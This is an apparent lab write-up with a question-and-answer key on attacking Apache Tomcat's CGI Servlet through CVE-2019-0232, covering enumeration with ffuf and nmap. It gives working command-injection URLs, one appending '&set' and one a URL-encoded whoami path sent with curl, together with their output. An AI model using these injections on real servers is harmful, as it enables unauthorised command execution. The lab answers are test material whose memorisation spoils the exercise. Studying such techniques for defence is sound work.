# Attacking Tomcat CGI
The CGI Servlet is a vital component of Apache Tomcat that enables web servers to communicate with external applications beyond the Tomcat JVM. These external applications are typically CGI scripts written in languages like Perl, Python, or Bash. The CGI Servlet receives requests from web browsers and forwards them to CGI scripts for processing.

In essence, a CGI Servlet is a program that runs on a web server, such as Apache2, to support the execution of external applications that conform to the CGI specification. It is a middleware between web servers and external information resources like databases.

## Enumeration
One way to uncover web server content is by utilising the ffuf web enumeration tool along with the dirb `common.txt` wordlist. Knowing that the default directory for CGI scripts is `/cgi`, either through prior knowledge or by researching the vulnerability, we can use the URL http://10.129.204.227:8080/cgi/FUZZ.cmd or http://10.129.204.227:8080/cgi/FUZZ.bat to perform fuzzing.

```sh
$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
```

```sh
$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
```

## Exploitation
As discussed above, we can exploit CVE-2019-0232 by appending our own commands through the use of the batch command separator `&`.

Retrieve a list of environmental variables by calling the `set` command:

```
http://10.129.204.227:8080/cgi/welcome.bat?&set
```

## Questions
1. After running the URL Encoded 'whoami' payload, what user is tomcat running as? **Answer: feldspar\omen**
   - Run a nmap scan to identify the tomcat webserver running on port 8080:
        ```sh
        $ sudo nmap -p- --open -sV 10.129.205.30
        Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-19 06:51 EDT
        Nmap scan report for 10.129.205.30
        Host is up (0.16s latency).
        Not shown: 64699 closed tcp ports (reset), 822 filtered tcp ports (no-response)
        Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
        PORT      STATE SERVICE       VERSION
        22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
        135/tcp   open  msrpc         Microsoft Windows RPC
        139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
        445/tcp   open  microsoft-ds?
        5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
        8009/tcp  open  ajp13         Apache Jserv (Protocol v1.3)
        8080/tcp  open  http          Apache Tomcat 9.0.17
        47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
        49664/tcp open  msrpc         Microsoft Windows RPC
        49665/tcp open  msrpc         Microsoft Windows RPC
        49666/tcp open  msrpc         Microsoft Windows RPC
        49667/tcp open  msrpc         Microsoft Windows RPC
        49668/tcp open  msrpc         Microsoft Windows RPC
        49669/tcp open  msrpc         Microsoft Windows RPC
        ```
   - Run `ffuf` to find a `.bat` file path:
        ```sh
        $ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
        <SNIP>
        [+] welcome
        ```
   - URL encode the command `c:\windows\system32\whoami.exe`:
        ```sh
        $ curl 'http://10.129.205.30:8080/cgi/welcome.bat?&%63%3a%5c%77%69%6e%64%6f%77%73%5c%73%79%73%74%65%6d%33%32%5c%77%68%6f%61%6d%69%2e%65%78%65'
        Welcome to CGI, this section is not functional yet. Please return to home page.
        feldspar\omen
        ```